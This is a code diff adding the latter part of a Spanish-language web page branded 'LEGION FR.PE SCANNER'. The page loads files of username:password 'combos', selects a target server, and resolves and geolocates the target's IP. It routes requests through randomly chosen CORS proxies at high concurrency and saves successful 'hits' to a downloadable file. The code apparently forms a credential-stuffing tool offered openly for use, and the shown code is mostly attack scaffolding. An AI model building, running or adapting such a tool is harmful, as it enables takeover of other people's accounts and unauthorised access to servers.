+                const header =
+                    `\n    \n   TOTAL HITS: ${unique.size}  \n\n\n`;
+                const content = Array.from(unique.values()).map(h => h.text).join('\n\n\n\n');
+                const fullContent = header + content;
+
+                const blob = new Blob([fullContent], { type: 'text/plain;charset=utf-8' });
+                const hostRaw = hostInput.value.trim().replace(/[^a-zA-Z0-9]/g, '_') || 'servidor';
+                const timestamp = new Date().toISOString().slice(0, 19).replace(/[:-]/g, '');
+                const filename = `HITS_LEGION_FRPE_${hostRaw}_${timestamp}.txt`;
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 5000);
+
+                console.log(`📥 Descarga iniciada: ${filename} (${unique.size} hits)`);
+
+            } catch (err) {
+                console.error(`❌ Error al descargar: ${err.message}`);
+                alert(`Error al descargar hits: ${err.message}`);
+            }
+        }
+
+        
+        function actualizarBotonInicio() {
+            const hasHost = !!hostInput.value.trim();
+            startBtn.disabled = !(hasHost && combosActuales.length > 0);
+        }
+
+        function fullReset() {
+            if (isRunning) stopRequested = true;
+            isRunning = false;
+            stopRequested = false;
+            hostInput.value = '';
+            comboFile.value = '';
+            combosActuales = [];
+            hitsContainer.innerHTML = '';
+            hits = [];
+            progressFill.style.width = '0%';
+            progressPct.textContent = '0%';
+            progressTextSpan.textContent = 'Esperando...';
+            currentComboSpan.textContent = '👤 Usuario: -';
+            hitsCount.innerHTML = '📜 HITS: 0';
+            hitsCountSide.textContent = '0';
+            serverIP = null;
+            serverGeo = null;
+            actualizarBotonInicio();
+        }
+
+        function limpiarCombos() {
+            if (isRunning) return;
+            comboFile.value = '';
+            combosActuales = [];
+            hitsContainer.innerHTML = '';
+            hits = [];
+            progressFill.style.width = '0%';
+            progressPct.textContent = '0%';
+            progressTextSpan.textContent = 'Esperando...';
+            currentComboSpan.textContent = '👤 Usuario: -';
+            hitsCount.innerHTML = '📜 HITS: 0';
+            hitsCountSide.textContent = '0';
+            actualizarBotonInicio();
+        }
+
+        function cargarArchivo() { comboFile.click(); }
+
+        function procesarArchivo() {
+            const file = comboFile.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = e => {
+                const lines = e.target.result.split(/\r?\n/);
+                const parsed = [];
+                for (const line of lines) {
+                    const p = extractCombo(line);
+                    if (p) parsed.push(`${p[0]}:${p[1]}`);
+                }
+                if (parsed.length === 0) { alert('Archivo sin combos válidos.'); return; }
+                combosActuales = parsed;
+                actualizarBotonInicio();
+            };
+            reader.readAsText(file);
+        }
+
+        function populatePresets() {
+           
+            presetSelect.innerHTML = '<option value="">-- Selecciona servidor --</option>';
+
+            UNIQUE_SERVERS.forEach(s => {
+                const opt = document.createElement('option');
+                opt.value = s;
+                opt.textContent = s;
+                presetSelect.appendChild(opt);
+            });
+
+            
+            presetSelect.style.display = 'none';
+            setTimeout(() => {
+                presetSelect.style.display = 'block';
+            }, 50);
+
+            console.log('📡 Servidores cargados:', UNIQUE_SERVERS.length);
+
+            presetSelect.addEventListener('change', function() {
+                if (this.value) {
+                    hostInput.value = this.value;
+                    actualizarBotonInicio();
+                }
+            });
+
+            
+            presetSelect.addEventListener('touchstart', function() {
+                
+                this.focus();
+            });
+        }
+
+        // ========== INICIO DEL ESCANEO ==========
+        async function startScan() {
+            if (isRunning) return;
+            stopRequested = false;
+            isRunning = true;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            saveBtn.disabled = true;
+            hitsContainer.innerHTML = '';
+            hits = [];
+            progressFill.style.width = '0%';
+            progressPct.textContent = '0%';
+            progressTextSpan.textContent = '🌐 Resolviendo IP...';
+            currentComboSpan.textContent = '👤 Usuario: -';
+            hitsCount.innerHTML = '📜 HITS: 0';
+            hitsCountSide.textContent = '0';
+
+            const rawHost = hostInput.value.trim();
+            if (!rawHost) { alert('Ingresa un host');
+                isRunning = false;
+                startBtn.disabled = false;
+                saveBtn.disabled = false; return; }
+            const host = rawHost.replace(/^https?:\/\//, '');
+            const conc = parseInt(concurrencyInput.value) || 120;
+            const nick = 'LEGION FR.PE';
+
+            const domainHost = host.split(':')[0];
+            try {
+                const resp = await fetch(`https://dns.google/resolve?name=${domainHost}&type=A`);
+                if (resp.ok) {
+                    const data = await resp.json();
+                    const ip = data.Answer?.find(a => a.type === 1)?.data;
+                    if (ip) {
+                        serverIP = ip;
+                        const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
+                        if (geoResp.ok) {
+                            const geo = await geoResp.json();
+                            if (geo.status === 'success') serverGeo = { ip, country: geo.country, city: geo.city };
+                        }
+                    }
+                }
+            } catch (e) {}
+
+            const shuffle = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
+            jobProxy = shuffle[0] || null;
+
+            if (combosActuales.length === 0) {
+                alert('No hay combos cargados.');
+                isRunning = false;
+                startBtn.disabled = false;
+                saveBtn.disabled = false;
+                return;
+            }
+
+            await processarJob(host, combosActuales, conc, nick);
+
+            isRunning = false;
+            stopBtn.disabled = true;
+            startBtn.disabled = false;
+            saveBtn.disabled = false;
+        }
+
+        // ========== EVENTOS ==========
+        startBtn.addEventListener('click', startScan);
+        stopBtn.addEventListener('click', () => { if (isRunning) stopRequested = true;
+            stopBtn.disabled = true; });
+        saveBtn.addEventListener('click', downloadHits);
+        loadFileBtn.addEventListener('click', cargarArchivo);
+        comboFile.addEventListener('change', procesarArchivo);
+        clearAllBtn.addEventListener('click', fullReset);
+        clearCombosBtn.addEventListener('click', limpiarCombos);
+        hostInput.addEventListener('input', actualizarBotonInicio);
+
+        
+        populatePresets();
+
+        actualizarBotonInicio();
+
+        console.log('LEGION Fr.Pe · SCANNER ');
+        console.log('📂 Los hits se guardan en: /sdcard/Download/Hits-LegionFrPe*.txt');
+
+        
+        setTimeout(() => {
+            if (presetSelect.options.length <= 1) {
+                console.log('⚠️ Reintentando cargar servidores...');
+                populatePresets();
+            }
+        }, 500);
+    </script>
+</body>
+</html>
